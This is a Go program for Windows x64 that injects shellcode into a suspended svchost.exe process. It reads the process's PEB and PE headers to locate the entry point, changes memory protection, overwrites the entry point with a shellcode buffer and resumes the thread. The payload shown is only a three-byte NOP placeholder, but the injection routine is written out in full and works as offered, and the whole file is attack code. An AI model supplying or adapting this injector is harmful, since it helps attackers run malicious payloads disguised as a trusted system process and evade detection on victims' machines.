package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

//Windows x64

const (
	IMAGE_DOS_SIGNATURE = 0x5A4D
	IMAGE_NT_SIGNATURE  = 0x00004550
)

const (
	PROCESS_BASIC_INFORMATION_CLASS = 0
)

var (
	ntdll                  = windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInfoProc        = ntdll.NewProc("NtQueryInformationProcess")
	ntReadVirtualProc      = ntdll.NewProc("NtReadVirtualMemory")
	ntWriteVirtualMemory   = ntdll.NewProc("NtWriteVirtualMemory")
	ntProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
	NtResumeThread         = ntdll.NewProc("NtResumeThread")
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

type IMAGE_DOS_HEADER struct {
	e_magic    uint16
	e_cblp     uint16
	e_cp       uint16
	e_crlc     uint16
	e_cparhdr  uint16
	e_minalloc uint16
	e_maxalloc uint16
	e_ss       uint16
	e_sp       uint16
	e_csum     uint16
	e_ip       uint16
	e_cs       uint16
	e_lfarlc   uint16
	e_ovno     uint16
	e_res      [4]uint16
	e_oemid    uint16
	e_oeminfo  uint16
	e_res2     [10]uint16
	e_lfanew   int32
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

func main() {

	srcPath := "c:\\\\windows\\\\system32\\\\svchost.exe"
	cmd, err := syscall.UTF16PtrFromString(srcPath)
	if err != nil {
		panic(err)
	}

	fmt.Printf("[!] Running EXE File: %v\n", srcPath)

	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	defer syscall.CloseHandle(pi.Thread)
	defer syscall.CloseHandle(pi.Process)

	// CREATE_SUSPENDED := 0x00000004
	err = syscall.CreateProcess(cmd, nil, nil, nil, false, 0x00000004, nil, nil, si, pi)
	if err != nil {
		panic(err)
	}

	//hProcess := uintptr(pi.Process)
	//hThread := uintptr(pi.Thread)
	dwProcessId := pi.ProcessId
	dwThreadId := pi.ThreadId
	fmt.Printf("[!] Process created.\n")
	fmt.Printf("[!] ProcessID: %v, ThreadID: %v\n", dwProcessId, dwThreadId)

	var pbi PROCESS_BASIC_INFORMATION

	// call NtQueryInformationProcess function
	ret, err := ntQueryInformationProcess(pi.Process, PROCESS_BASIC_INFORMATION_CLASS, uintptr(unsafe.Pointer(&pbi)), uint32(unsafe.Sizeof(pbi)), nil)
	if ret != 0 {
		fmt.Println("[-] Error calling NtQueryInformationProcess:", err)
		return
	}

	image_base_offset := pbi.PebBaseAddress + 0x10

	var image_base_buffer [unsafe.Sizeof(uintptr(0))]byte
	var bytesRead uintptr

	status, err := ntReadVirtualMemory(pi.Process, image_base_offset, uintptr(unsafe.Pointer(&image_base_buffer[0])), uintptr(len(image_base_buffer)), &bytesRead)
	if status != 0 {
		fmt.Println("[-] Error calling NtReadVirtualMemory:", err)
		return
	}
	imageBaseAddress := *(*uintptr)(unsafe.Pointer(&image_base_buffer[0]))

	var image_dos_header IMAGE_DOS_HEADER

	status, err = ntReadVirtualMemory(pi.Process, imageBaseAddress, uintptr(unsafe.Pointer(&image_dos_header)), unsafe.Sizeof(image_dos_header), &bytesRead)
	if status != 0 {
		fmt.Println("[-] Error calling NtReadVirtualMemory:", err)
		return
	}

	if image_dos_header.e_magic != IMAGE_DOS_SIGNATURE {
		fmt.Println("[-] Error: IMAGE_DOS_HEADER is invalid")
	}

	var image_nt_header IMAGE_NT_HEADERS64
	//var image_optional_header64 ImageOptionalHeader64
	ntHeaderOffset := imageBaseAddress + uintptr(image_dos_header.e_lfanew)

	status, err = ntReadVirtualMemory(pi.Process, ntHeaderOffset, uintptr(unsafe.Pointer(&image_nt_header)), unsafe.Sizeof(image_nt_header), &bytesRead)
	if status != 0 {
		fmt.Println("[-] Error calling NtReadVirtualMemory:", err)
		return
	}

	if image_nt_header.Signature != IMAGE_NT_SIGNATURE {
		fmt.Println("[-] Error: IMAGE_NT_HEADER is invalid")
	}
	//sizeOfOptionalHeader := image_nt_header.FileHeader.SizeOfOptionalHeader

	addressOfEntryPoint := uintptr(image_nt_header.OptionalHeader.AddressOfEntryPoint)
	entrypoint := imageBaseAddress + addressOfEntryPoint

	shellcode := []byte{0x90, 0x90, 0x90}

	var base_address = entrypoint
	var shellcode_buffer_length = uint32(len(shellcode))
	var oldProtect uint32
	var temp uint32

	status, err = NtProtectVirtualMemory(pi.Process, &base_address, uintptr(shellcode_buffer_length), windows.PAGE_READWRITE, &oldProtect)

	if status != 0 {
		fmt.Println("[-] Error calling NtProtectVirtualMemory:", err)
		return
	}

	var bytesWritten uint32
	err = NtWriteVirtualMemory(pi.Process, entrypoint, shellcode, uint32(len(shellcode)), &bytesWritten)
	if err != nil {
		fmt.Println("[-] Error calling NtProtectVirtualMemory:", err)
		return
	}

	fmt.Printf("[!] Shellcode written to virtual memory successfully\n")

	//restore memory protection
	status, err = NtProtectVirtualMemory(pi.Process, &base_address, uintptr(shellcode_buffer_length), oldProtect, &temp)

	if status != 0 {
		fmt.Println("[-] Error calling NtProtectVirtualMemory:", err)
		return
	}
	fmt.Printf("[!] Restore memory protection successfully\n")

	err = resumeThread(windows.Handle(pi.Thread))
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("[!] Resume Thread successfully")

}

func ntQueryInformationProcess(processHandle syscall.Handle, processInformationClass uint32, processInformation uintptr, processInformationLength uint32, returnLength *uint32) (uintptr, error) {
	ret, _, err := ntQueryInfoProc.Call(
		uintptr(processHandle),
		uintptr(processInformationClass),
		processInformation,
		uintptr(processInformationLength),
		uintptr(unsafe.Pointer(returnLength)),
	)
	if ret != 0 {
		return 0, err
	}
	return ret, nil
}

func ntReadVirtualMemory(processHandle syscall.Handle, baseAddress uintptr, buffer uintptr, size uintptr, bytesRead *uintptr) (uintptr, error) {
	ret, _, err := ntReadVirtualProc.Call(
		uintptr(processHandle),
		baseAddress,
		buffer,
		size,
		uintptr(unsafe.Pointer(bytesRead)),
	)
	if ret != 0 {
		return 0, err
	}
	return ret, nil
}

// NtProtectVirtualMemory change memory protection.
func NtProtectVirtualMemory(processHandle syscall.Handle, baseAddress *uintptr, regionSize uintptr, newProtect uint32, oldProtect *uint32) (uintptr, error) {
	r1, _, err := syscall.SyscallN(
		ntProtectVirtualMemory.Addr(),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
		0,
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory failed: %v", err)
	}
	//print("SYSCALL: NtProtectVirtualMemory(", "hProcess=", processHandle, ", ", "lpAddress=", baseAddress, ", ", "dwSize=", regionSize, ", ", "flNewProtect=", newProtect, ", ", "lpflOldProtect=", oldProtect, ") (", "err=", err, ")\n")

	return r1, nil
}

// ntWriteVirtualMemory calls NtWriteVirtualMemory to write to virtual memory.
func NtWriteVirtualMemory(processHandle syscall.Handle, baseAddress uintptr, buffer []byte, numberOfBytesToWrite uint32, numberOfBytesWritten *uint32) (err error) {
	r1, _, _ := syscall.SyscallN(ntWriteVirtualMemory.Addr(),
		uintptr(processHandle),
		baseAddress,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(numberOfBytesToWrite),
		uintptr(unsafe.Pointer(numberOfBytesWritten)),
		0)
	if r1 != 0 {
		err = syscall.Errno(r1)
	}
	return
}

func resumeThread(threadHandle windows.Handle) error {
	var suspendCount uint32
	status, _, _ := NtResumeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&suspendCount)),
	)
	if status != 0 {
		return fmt.Errorf("Failed to call NtResumeThread: %x", status)
	}
	return nil
}
